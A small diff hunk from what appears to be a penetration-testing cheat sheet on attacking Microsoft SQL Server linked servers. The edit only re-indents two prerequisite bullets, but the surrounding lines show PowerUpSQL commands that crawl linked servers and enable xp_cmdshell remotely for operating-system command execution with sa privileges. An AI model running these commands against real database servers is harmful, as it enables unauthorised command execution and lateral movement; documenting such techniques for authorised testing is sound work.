@@ -187,8 +187,8 @@ Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query 'exec master..xp
 ```
 ### Execute Remote SQLQuery
 _Prerequisite:_
-	* Make sure you are **sa** user (high privileged user)
-	* Make sure to enable `xp_cmdshell` before executing os command
+* Make sure you are **sa** user (high privileged user)
+* Make sure to enable `xp_cmdshell` before executing os command
 ```
 # Enable xp_cmdshell
 Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'
